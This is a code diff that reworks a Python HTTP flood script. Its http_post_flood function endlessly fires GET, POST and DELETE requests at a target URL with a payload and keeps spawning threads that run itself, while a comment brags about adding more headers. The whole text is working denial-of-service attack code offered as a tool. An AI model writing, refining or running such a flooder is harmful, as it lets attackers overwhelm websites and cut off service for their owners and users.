@@ -76,24 +76,20 @@ headers = { #gonna add more headers soon the more the better HA HA HA HA HAAA
     "User-Agent":random.choice(uagent)
 }
 
-def http_post_flood(): # dont worry theres gonna be way more shit added to the method
-  while True:
-    x = url
-    g = requests.get(x) #get
-    p = requests.post(x,data=payload) #post
-    e = requests.post(x,data=payload) #post
-    w = requests.get(x) #get
-    d = requests.delete(x, data=payload)
-    #print("GET STATUS: \r"+g+" \nPOST STATUS: "+p)
-    t1 = threading.Thread(target=http_post_flood)
-    t2 = threading.Thread(target=http_post_flood)
-    t3 = threading.Thread(target=http_post_flood)
-    t4 = threading.Thread(target=http_post_flood)
-    t5 = threading.Thread(target=http_post_flood)
-    t1.start()
-    t2.start()
-    t3.start()
-    t4.start()
-    t5.start()
-    print(f"Successfull Thread Sent To:"+url+":{round(finish-start, 2)} second(s) ago")
+def http_post_flood():
+    with requests.Session() as session:
+        while True:
+            g = session.get(url)
+            p = session.post(url, data=payload)
+            e = session.post(url, data=payload)
+            w = session.get(url)
+            d = session.delete(url, data=payload)
+            # print("GET STATUS: \r" + str(g) + " \nPOST STATUS: " + str(p))
+            t1 = threading.Thread(target=http_post_flood)
+            t2 = threading.Thread(target=http_post_flood)
+            t1.start()
+            t2.start()
+            t1.join()
+            t2.join()
+            print(f"Successfull Thread Sent To:"+url+":{round(finish-start, 2)} second(s) ago")
 http_post_flood()
